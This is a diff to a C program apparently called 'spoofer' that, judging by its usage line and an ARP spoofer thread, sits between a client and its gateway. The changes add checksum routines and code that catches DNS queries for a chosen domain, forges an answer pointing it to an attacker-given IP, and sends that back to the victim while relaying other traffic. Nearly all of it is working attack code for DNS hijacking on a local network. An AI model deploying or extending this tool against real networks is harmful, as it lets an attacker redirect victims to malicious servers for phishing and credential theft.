@@ -1,5 +1,5 @@
 // This program requires root privilages.
-// Usage: ./spoofer INTERFACE GW_HW_ADDR GW_IP_ADDR CLIENT_IP_ADDR IP_MASK HIJACKED_DOMAIN
+// Usage: ./spoofer INTERFACE GW_HW_ADDR GW_IP_ADDR CLIENT_IP_ADDR IP_MASK HIJACKED_DOMAIN SPOOFED_IP
 
 #include <arpa/inet.h>
 #include <linux/if_ether.h>
@@ -16,6 +16,77 @@
 #include <libnet.h>
 
 #include "dns_helpers.h"
+
+ //! \brief
+ //!     Calculate the UDP checksum (calculated with the whole
+ //!     packet).
+ //! \param buff The UDP packet.
+ //! \param len The UDP packet length.
+ //! \param src_addr The IP source address (in network format).
+ //! \param dest_addr The IP destination address (in network format).
+ //! \return The result of the checksum.
+ uint16_t udp_checksum(const void *buff, size_t len, in_addr_t src_addr, in_addr_t dest_addr)
+ {
+         const uint16_t *buf=buff;
+         uint16_t *ip_src=(void *)&src_addr, *ip_dst=(void *)&dest_addr;
+         uint32_t sum;
+         size_t length=len;
+ 
+         // Calculate the sum                                            //
+         sum = 0;
+         while (len > 1)
+         {
+                 sum += *buf++;
+                 if (sum & 0x80000000)
+                         sum = (sum & 0xFFFF) + (sum >> 16);
+                 len -= 2;
+         }
+ 
+         if ( len & 1 )
+                 // Add the padding if the packet lenght is odd          //
+                 sum += *((uint8_t *)buf);
+ 
+         // Add the pseudo-header                                        //
+         sum += *(ip_src++);
+         sum += *ip_src;
+ 
+         sum += *(ip_dst++);
+         sum += *ip_dst;
+ 
+         sum += htons(IPPROTO_UDP);
+         sum += htons(length);
+ 
+         // Add the carries                                              //
+         while (sum >> 16)
+                 sum = (sum & 0xFFFF) + (sum >> 16);
+ 
+         // Return the one's complement of sum                           //
+         return ( (uint16_t)(~sum)  );
+ }
+
+//! \brief Calculate the IP header checksum.
+//! \param buf The IP header content.
+//! \param hdr_len The IP header length.
+//! \return The result of the checksum.
+uint16_t ip_checksum(const void *buf, size_t hdr_len)
+{
+        unsigned long sum = 0;
+        const uint16_t *ip1;
+
+        ip1 = buf;
+        while (hdr_len > 1)
+        {
+                sum += *ip1++;
+                if (sum & 0x80000000)
+                        sum = (sum & 0xFFFF) + (sum >> 16);
+                hdr_len -= 2;
+        }
+
+        while (sum >> 16)
+                sum = (sum & 0xFFFF) + (sum >> 16);
+
+        return(~sum);
+}
 
 void * arp_spoofer(void * param)
 {
@@ -61,6 +132,7 @@ int main(int argc, char** argv) {
   char* frame;
   char* fdata;
   struct ethhdr* fhead;
+  struct iphdr *ip;
   struct ifreq ifr;
   struct sockaddr_ll sall, gwall;
   struct in_addr gway, mask, bcast;
@@ -68,6 +140,8 @@ int main(int argc, char** argv) {
   unsigned char hwaddr[6];
   struct udphdr *udp;
   char * udpdata;
+  struct dns_header_window * dnshdr;
+  struct dns_answer * answer;
   
   // get broadcast address
   inet_pton(AF_INET, argv[3], &(gway));
@@ -119,7 +193,6 @@ int main(int argc, char** argv) {
     fhead = (struct ethhdr*) frame;
     fdata = frame + ETH_HLEN;
     len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, NULL, NULL);
-    struct iphdr *ip;
     ip = (struct iphdr *)fdata;
     inet_ntop(AF_INET, &ip->saddr, (char*) &saddr, 16);
     inet_ntop(AF_INET, &ip->daddr, (char*) &daddr, 16);
@@ -135,23 +208,25 @@ int main(int argc, char** argv) {
       udp = (struct udphdr*)((char *)ip + (ip->ihl * 4));
       udpdata = (char *)ip + (ip->ihl * 4) + sizeof(struct udphdr);
 
+      // analyse DNS request
       if (ntohs(udp->dest) == 53)
       {
-        unsigned short id, flags, qs, as;
+        unsigned short flags;
         char * query;
         int dnslen = ntohs(udp->len) - 8;
 
-        id = (udpdata[0] << 8 | udpdata[1] << 0);
-        flags = (udpdata[2] << 8 | udpdata[3] << 0);
-        qs = (udpdata[4] << 8 | udpdata[5] << 0);
-        as = (udpdata[6] << 8 | udpdata[7] << 0);
+        dnshdr = (struct dns_header_window *) udpdata;
+
+        flags = ntohs(dnshdr->flags);
 
         query = udpdata + 12;
 
         struct domain * d = domain_struct_from_dns_query(query);
 
-        // relay packet and continue if requested domain doesn't match the hijacked one
-        if (compare_domain_structs(d, hijacked) != 0)
+        unsigned short opcode_mask = (1 << 14 | 1 << 13 | 1 << 12 | 1 << 11);
+
+        // relay packet and continue if requested domain doesn't match the hijacked one or the request is not a standard query
+        if (compare_domain_structs(d, hijacked) != 0 || (opcode_mask & flags) != 0)
         {
           memcpy(fhead->h_source, hwaddr, ETH_ALEN);
 
@@ -162,20 +237,21 @@ int main(int argc, char** argv) {
           len = sendto(gwsfd, frame, len, 0,
                 (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
 
+          // struct domain * head = d;
+          // while (head != NULL)
+          // {
+          //   printf("%s.", head->content);
+          //   head = head->next;
+          // }
+          // printf("\n");
+
+          free(frame);
+          delete_domain_struct(d);
+
           continue;
         }
 
-        struct domain * head = d;
-        while (d != NULL)
-        {
-          printf("%s.", d->content);
-          d = d->next;
-        }
-        printf("\n\n\n");
-        delete_domain_struct(head);
-
-        printf("ID: %hu, questions: %hu\n", id, qs);
-
+        printf("got:\n");
         for (i = 0; i < dnslen ; i++) {
           printf("%02x ", (char) udpdata[i]);
           if ((i + 1) % 16 == 0)
@@ -183,14 +259,73 @@ int main(int argc, char** argv) {
         }
         printf("\n\n");
 
+        // start building spoofed answer
+        unsigned short new_flags = 0;
+        new_flags = new_flags
+          | 1 << 15               // this is a response
+          | (flags & opcode_mask) // copy opcode
+          | (flags & (1 << 8))    // copy RD
+          | (1 << 7);             // set RA
+
+        dnshdr->flags = htons(new_flags);
+        dnshdr->as = htons(1);
+
+        answer = (struct dns_answer *)(udpdata + dnslen);
+        // spoof the answer
+        answer->name = htons(0xc00c);
+        answer->type = htons(1);
+        answer->cls = htons(1);
+        answer->ttl = htonl(120);
+        answer->len = htons(4);
+        inet_pton(AF_INET, argv[7], &answer->data);
+
+        // swap ports
+        unsigned short port = udp->dest;
+        udp->dest = udp->source;
+        udp->source = port;
+
+        // update lengths
+        udp->len = htons(ntohs(udp->len) + 16);
+        ip->tot_len = htons(ntohs(ip->tot_len) + 16);
+
+        ip->check = 0;
+        udp->check = 0;
+
+        // swap ip addresses
+        inet_pton(AF_INET, daddr, &ip->saddr);
+        inet_pton(AF_INET, saddr, &ip->daddr);
+
+        //ip->frag_off = IP_DF;
+        ip->frag_off = ntohs(1 << 14);
+
+        // calculate checksums
+        udp->check = udp_checksum(udp, udp->len, ip->saddr, ip->daddr);
+        ip->check = ip_checksum(ip, udp->len + (ip->ihl * 4));
+
+        int answerlen = dnslen + 16;
+
+        printf("to send:\n");
+        for (i = 0; i < answerlen ; i++) {
+          printf("%02x ", (char) udpdata[i]);
+          if ((i + 1) % 16 == 0)
+            printf("\n");
+        }
+        printf("\n\n");
+
+        // swap hardware addresses
+        memcpy(fhead->h_dest, fhead->h_source, ETH_ALEN);
         memcpy(fhead->h_source, hwaddr, ETH_ALEN);
 
-        sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-          &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
-          &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
+        // sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+        //   &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
+        //   &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
 
-        len = sendto(gwsfd, frame, len, 0,
+        len = sendto(gwsfd, frame, len + 16, 0,
               (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
+
+        printf("sent\n");
+
+        delete_domain_struct(d);
       }
       // relay other UDP datagrams
       else
